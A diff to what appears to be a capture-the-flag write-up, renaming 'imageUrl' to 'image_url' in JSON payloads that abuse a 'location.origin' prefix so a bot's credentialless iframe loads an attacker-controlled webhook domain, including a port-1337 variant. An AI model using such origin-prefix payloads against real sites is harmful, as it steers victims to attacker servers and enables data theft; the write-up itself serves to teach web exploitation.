@@ -249,13 +249,13 @@ const imageUrl = `${location.origin}${postData.default.image_url}`;
 document.getElementById("imageFrame").src = imageUrl;
 ```
 
-so we can essentially control the source of `credentialless` iframe provided that it starts with `location.origin` which in our target's _(bot)_ case, will be `http://web`. We can achieve that by either using [webhook.site](https://webhook.site/), or by having our own domain set up to have a `web` subdomain / prefix. As the body of the image, we then provide any title/description, and the imageUrl, with the cut-off `http://web` prefix:
+so we can essentially control the source of `credentialless` iframe provided that it starts with `location.origin` which in our target's _(bot)_ case, will be `http://web`. We can achieve that by either using [webhook.site](https://webhook.site/), or by having our own domain set up to have a `web` subdomain / prefix. As the body of the image, we then provide any title/description, and the image_url, with the cut-off `http://web` prefix:
 
 ```json
 {
 	"title": "123",
 	"description": "456",
-	"imageUrl": ".cyber-man.pl/hook" // will become `http://web.cyber-man.pl/hook` from the bot's point of view.
+	"image_url": ".cyber-man.pl/hook" // will become `http://web.cyber-man.pl/hook` from the bot's point of view.
 }
 ```
 
@@ -387,7 +387,7 @@ So to finally exploit the server, we'd need to setup our webhook server, create 
 {
 	"title": "123",
 	"description": "456",
-	"imageUrl": ".cyber-man.pl:1337"
+	"image_url": ".cyber-man.pl:1337"
 }
 ```
 
